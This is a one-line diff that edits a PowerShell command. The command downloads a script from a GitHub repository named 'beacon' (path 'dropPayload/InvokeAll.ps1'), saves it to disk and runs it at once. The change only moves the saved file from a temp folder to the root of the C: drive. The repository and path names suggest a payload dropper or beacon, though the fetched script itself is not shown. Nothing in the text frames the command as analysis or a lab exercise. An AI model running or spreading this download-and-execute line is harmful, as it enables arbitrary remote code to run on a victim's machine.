@@ -1,1 +1,1 @@
-Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/dropPayload/InvokeAll.ps1 > C:\temp\beacon\start.ps1; C:\temp\beacon\start.ps1
+Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/dropPayload/InvokeAll.ps1 > C:\start.ps1; C:\start.ps1
